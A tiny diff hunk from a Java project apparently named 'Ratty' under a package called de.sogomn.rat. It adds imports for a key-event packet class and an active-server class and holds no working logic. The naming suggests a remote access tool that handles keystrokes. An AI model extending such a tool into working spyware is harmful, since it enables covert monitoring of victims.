@@ -2,6 +2,9 @@ package de.sogomn.rat;
 
 import java.awt.event.KeyEvent;
 
+import de.sogomn.rat.packet.KeyEventPacket;
+import de.sogomn.rat.server.ActiveServer;
+
 
 public final class Ratty {
 	
